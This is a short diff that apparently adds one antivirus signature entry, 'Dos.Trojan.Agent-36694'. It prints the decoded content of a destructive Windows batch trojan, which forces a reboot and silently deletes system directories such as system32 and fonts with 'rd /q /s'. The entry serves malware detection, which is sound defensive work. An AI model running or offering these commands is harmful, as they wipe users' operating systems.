@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36694
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off shutdown.exe -r -f -t 20 -c "don`t panic. the system will reboot in 20 seconds." rd /q /s %windir%\assembly rd /q /s %windir%\fonts rd /q /s %windir\media rd /q /s %windir%\registration rd /q /s %windir\web rd /q /s %windir%\system32
